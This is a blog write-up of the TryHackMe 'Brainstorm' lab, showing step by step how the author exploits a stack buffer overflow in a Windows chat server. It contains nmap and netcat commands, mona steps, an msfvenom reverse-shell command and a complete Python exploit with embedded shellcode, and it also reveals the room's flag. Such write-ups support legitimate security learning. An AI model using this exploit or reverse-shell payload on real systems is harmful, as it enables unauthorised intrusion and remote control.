<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Brainstorm Write-up | TryHackMe | Utkarsh M</title>
    <link rel="stylesheet" href="/css/style.css" />
    <link rel="stylesheet" href="/css/fonts.css" />
    
  </head>

  <body>
    <header class="site-title-main">
      Utkarsh M
    </header>
    <nav>
    <ul class="menu">
      
      <li><a href="/">Home</a></li>
      
      <li><a href="/post/">Posts</a></li>
      
      <li><a href="/categories/">Categories</a></li>
      
      <li><a href="/about/">About</a></li>
      
    </ul>
    <hr/>
    </nav>

<div class="post-container">
  <div class="post-date">2022/06/12</div>
  <h1 class="post-title">Brainstorm Write-up | TryHackMe</h1>
</div>

<main>
<p><img src="/assets/img/thm/Brainstorm/1.png" alt="screenshot"></p>
<p>Reverse engineer a chat program and write a script to exploit a Windows machine.</p>
<hr>
<p>Running threader3000 scan:</p>
<pre><code class="language-bash">python threader3000.py
10.10.197.53
</code></pre>
<p><img src="/assets/img/thm/Brainstorm/2.png" alt="screenshot"></p>
<p>Q) How many ports are open? Ans .3 gives wrong answer, let us run Nmap Udp scan in the side:</p>
<pre><code class="language-bash">sudo sudo nmap -sU -p- -Pn -vv 10.10.197.53
</code></pre>
<p>Till then, Running the suggested Nmap Scan:</p>
<p><img src="/assets/img/thm/Brainstorm/3.png" alt="screenshot"></p>
<p><img src="/assets/img/thm/Brainstorm/4.png" alt="screenshot"></p>
<p>We can login anonymously into the ftp.</p>
<p>;-; Since I’ve always felt the need to use Win VM. Took a while to set it up using QEMU. Had to restart the machine.</p>
<p>UDP scan gave up no results. :_; skipping it for a while.</p>
<p>visiting ftp:</p>
<p><img src="/assets/img/thm/Brainstorm/5.png" alt="screenshot"></p>
<p>answering task-2 question:</p>
<p>Q)What is the name of the exe file you found?</p>
<pre><code class="language-bash">chatserver.exe
</code></pre>
<p>after downloading the files on windows vm.</p>
<p>lets checkout the unknown port ;-; by using netcat</p>
<pre><code class="language-bash">nc 10.10.91.109 9999
</code></pre>
<p>response:</p>
<pre><code class="language-bash">[ut@utkar5hm-g14-arch thm]$ nc 10.10.91.109 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): utkarsh
Write a message: hello there
Sun Jun 12 05:27:43 2022
utkarsh said: hello there
Write a message:
Sun Jun 12 05:27:44 2022
utkarsh said:
</code></pre>
<p>lets get back :-; to the VM and the exe obtained</p>
<p>trying to open it in immunity debugger:</p>
<p><img src="/assets/img/thm/Brainstorm/6.png" alt="screenshot"></p>
<p>After troubleshooting for some time and later checking out discord, I found out that it needs to be downloaded in binary mode. :-;</p>
<p>I can finally launch the application:</p>
<p>can be accessed using nc:</p>
<pre><code class="language-bash">nc 192.168.122.138 9999
</code></pre>
<p><img src="/assets/img/thm/Brainstorm/7.png" alt="screenshot"></p>
<p>trying to overflow username input:</p>
<p>it checks lengths for smaller inputs greater than 20.</p>
<p>using a very large input: ;-;</p>
<pre><code class="language-shell">/opt/metasploit-git/tools/exploit/pattern_create.rb -l 10000
</code></pre>
<p>Looks like it isn’t vulnerable to buffer overflow. We will have to work with the message.;_;</p>
<p>lets try it with :-; the message, increasing length on each try by generating input from the above command.</p>
<p>we get a error at l=2100</p>
<p>let’s setup mona in immunity debugger.</p>
<p>config:</p>
<pre><code class="language-shell">!mona config -set workingfolder c:\mona\%p&quot;
</code></pre>
<p>for finding eip offset:</p>
<pre><code class="language-shell">!mona findmsp -distance 2100
</code></pre>
<p>output offset: <code>2012</code></p>
<p><img src="/assets/img/thm/Brainstorm/8.png" alt="screenshot"></p>
<p>Now we need to check for bad characters ;-; for generating our shell.</p>
<p>lets first create a bytearray.bin using mona:</p>
<pre><code class="language-shell">!mona bytearray -b &quot;\x00&quot;
</code></pre>
<p>generating badchars for input, using python script:</p>
<pre><code class="language-python">for x in range(1, 256):
print(&quot;\\x&quot; + &quot;{:02x}&quot;.format(x), end='')
print()
</code></pre>
<p>we will send the below as input:</p>
<pre><code>“A”*offset+ EIP(for returning) + badchars
</code></pre>
<p>we will make make use of a python script from here and modify it to our purposes: <a href="https://stackoverflow.com/questions/50852062/send-byte-over-tcp-python">link</a></p>
<pre><code class="language-python">import socket
import struct
TCP_IP = '192.168.122.138'
TCP_PORT = 9999
BUFFER_SIZE = 1024
MESSAGE = b&quot;hello&quot;
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.recv(BUFFER_SIZE)#welcome msg
s.recv(BUFFER_SIZE)#msg for username input
s.send(MESSAGE)#sending hello as username
s.recv(BUFFER_SIZE)#msg for message input
payload =&quot;&quot;
s.send(bytes(&quot;A&quot;*2012 + &quot;BBBB&quot;+ payload , &quot;latin-1&quot;))
s.close()
print( &quot;done&quot;)
</code></pre>
<p>setting payload to our required value: here the hex values generated to check for badchars. here the retn value is temporarily set to BBBB. which can be changed to whatever we want.</p>
<p>After sending the payload.</p>
<p>we can use mona’s compare function to check for bad characters:</p>
<pre><code class="language-shell">!mona compare -f &quot;c:\mona\bytearray.bin&quot; -a ESP
</code></pre>
<p>output:</p>
<p><img src="/assets/img/thm/Brainstorm/9.png" alt="screenshot"></p>
<p>As it is unmodified. we don’t need to check further.</p>
<p>To find a jmp esp instruction, we can again use mona. It can find instructions where aslr is not enabled.</p>
<pre><code class="language-shell">!mona jmp -r esp -cpb &quot;\x00&quot;
</code></pre>
<p><img src="/assets/img/thm/Brainstorm/10.png" alt="screenshot"></p>
<p>we, will currently take the 0x625014df as the return address(EIP). :-;</p>
<p>As the system follows little endian, we need to switch EIP value with <code>\xdf\x14\x50\x62</code> in the python script. (currently <code>BBBB</code>)</p>
<p>using msfvenom to create a payload for reverse shell.</p>
<pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=10.17.47.158 LPORT=4444 EXITFUNC=thread -b &quot;\x00&quot; -f c
</code></pre>
<p>We will also add NOP padding of 16 characters just before the payload:<code>”\x90&quot;*16</code></p>
<p>setting up a netcat listener at port 4444.</p>
<pre><code class="language-bash">nc -lvnp 4444
</code></pre>
<p>executing it locally:</p>
<p><img src="/assets/img/thm/Brainstorm/11.png" alt="screenshot"></p>
<p>we do gain a reverse shell, lets try it on the tryhackme’s system, :-; since I crashed the server last time. I have to restart it again. xD</p>
<p>It wasn’t working and then I tried generating other payloads specifying x86 architecture which failed too. finally, I tried setting up a listener with the attack box which successfully worked.</p>
<p><img src="/assets/img/thm/Brainstorm/12.png" alt="screenshot"></p>
<p>Final flag:</p>
<pre><code>5b1001de5a44eca47eee71e7942a8f8a
</code></pre>
<p>The final script:</p>
<pre><code class="language-python">import socket
import struct
TCP_IP = '10.10.30.155'
TCP_PORT = 9999
BUFFER_SIZE = 1024
MESSAGE = b&quot;hello&quot;
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
print(s.recv(BUFFER_SIZE))
print(s.recv(BUFFER_SIZE))
s.send(MESSAGE)
print(s.recv(BUFFER_SIZE))
payload = (&quot;\xb8\x03\xdb\xd2\x5c\xda\xd7\xd9\x74\x24\xf4\x5f\x33\xc9\xb1&quot;
&quot;\x52\x83\xef\xfc\x31\x47\x0e\x03\x44\xd5\x30\xa9\xb6\x01\x36&quot;
&quot;\x52\x46\xd2\x57\xda\xa3\xe3\x57\xb8\xa0\x54\x68\xca\xe4\x58&quot;
&quot;\x03\x9e\x1c\xea\x61\x37\x13\x5b\xcf\x61\x1a\x5c\x7c\x51\x3d&quot;
&quot;\xde\x7f\x86\x9d\xdf\x4f\xdb\xdc\x18\xad\x16\x8c\xf1\xb9\x85&quot;
&quot;\x20\x75\xf7\x15\xcb\xc5\x19\x1e\x28\x9d\x18\x0f\xff\x95\x42&quot;
&quot;\x8f\xfe\x7a\xff\x86\x18\x9e\x3a\x50\x93\x54\xb0\x63\x75\xa5&quot;
&quot;\x39\xcf\xb8\x09\xc8\x11\xfd\xae\x33\x64\xf7\xcc\xce\x7f\xcc&quot;
&quot;\xaf\x14\xf5\xd6\x08\xde\xad\x32\xa8\x33\x2b\xb1\xa6\xf8\x3f&quot;
&quot;\x9d\xaa\xff\xec\x96\xd7\x74\x13\x78\x5e\xce\x30\x5c\x3a\x94&quot;
&quot;\x59\xc5\xe6\x7b\x65\x15\x49\x23\xc3\x5e\x64\x30\x7e\x3d\xe1&quot;
&quot;\xf5\xb3\xbd\xf1\x91\xc4\xce\xc3\x3e\x7f\x58\x68\xb6\x59\x9f&quot;
&quot;\x8f\xed\x1e\x0f\x6e\x0e\x5f\x06\xb5\x5a\x0f\x30\x1c\xe3\xc4&quot;
&quot;\xc0\xa1\x36\x4a\x90\x0d\xe9\x2b\x40\xee\x59\xc4\x8a\xe1\x86&quot;
&quot;\xf4\xb5\x2b\xaf\x9f\x4c\xbc\xda\x55\x2b\x2e\xb3\x6b\xb3\x5e&quot;
&quot;\xd1\xe5\x55\x34\xc5\xa3\xce\xa1\x7c\xee\x84\x50\x80\x24\xe1&quot;
&quot;\x53\x0a\xcb\x16\x1d\xfb\xa6\x04\xca\x0b\xfd\x76\x5d\x13\x2b&quot;
&quot;\x1e\x01\x86\xb0\xde\x4c\xbb\x6e\x89\x19\x0d\x67\x5f\xb4\x34&quot;
&quot;\xd1\x7d\x45\xa0\x1a\xc5\x92\x11\xa4\xc4\x57\x2d\x82\xd6\xa1&quot;
&quot;\xae\x8e\x82\x7d\xf9\x58\x7c\x38\x53\x2b\xd6\x92\x08\xe5\xbe&quot;
&quot;\x63\x63\x36\xb8\x6b\xae\xc0\x24\xdd\x07\x95\x5b\xd2\xcf\x11&quot;
&quot;\x24\x0e\x70\xdd\xff\x8a\x90\x3c\xd5\xe6\x38\x99\xbc\x4a\x25&quot;
&quot;\x1a\x6b\x88\x50\x99\x99\x71\xa7\x81\xe8\x74\xe3\x05\x01\x05&quot;
&quot;\x7c\xe0\x25\xba\x7d\x21&quot;)
overflow = &quot;A&quot;*2012
retn = &quot;\xdf\x14\x50\x62&quot;
padding = &quot;\x90&quot;*16
msg = overflow + retn + padding + payload
s.send(bytes(msg, &quot;latin-1&quot;))
s.close()
print( &quot;done&quot;)
</code></pre>
<p>After trying to find out :-; the final open ports, It was reported on discord as a issue by many. and its answer was 6.</p>

</main>

  <footer>
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/math-code.min.js" defer></script>
<script src="//cdn.jsdelivr.net/npm/katex/dist/katex.min.js" defer></script>
<script src="//cdn.jsdelivr.net/npm/katex/dist/contrib/auto-render.min.js" defer></script>
<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/render-katex.js" defer></script>

<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/center-img.min.js" defer></script>

  
  <hr/>
  © <a href="https://utkar5hm.github.io">Utkarsh M</a> 2025 &ndash; 2025 | <a href="https://github.com/Utkar5hM">Github</a> | <a href="https://www.linkedin.com/in/utkar5hm/">Linkedin</a>
  
  </footer>
  </body>
</html>

